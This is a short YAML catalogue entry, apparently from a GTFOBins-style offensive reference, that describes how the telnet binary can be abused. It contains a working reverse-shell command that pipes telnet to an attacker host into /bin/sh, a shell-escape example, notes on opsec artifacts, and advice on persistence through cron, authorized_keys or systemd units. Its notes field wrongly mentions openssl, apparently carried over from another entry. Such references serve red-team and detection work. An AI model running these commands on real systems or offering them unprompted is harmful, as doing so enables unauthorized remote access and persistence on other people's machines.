---
name: telnet
capabilities:
- exec
- spawn
- reverse-shell
required_permissions:
  level: user
difficulty: low
opsec:
  noise: high
  artifacts:
  - ~/.bash_history
  - Network connection logs / firewall logs
  - auditd execve events
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: reverse-shell
  description: Initiate a reverse shell to attacker host.
  capabilities:
  - reverse-shell
  - exec
  command: |-
    mkfifo /path/to/temp-socket
    telnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket
  notes: The shell process is not spawn by `openssl`.
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    telnet
    !/bin/sh
references:
- https://gtfobins.github.io/gtfobins/telnet/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
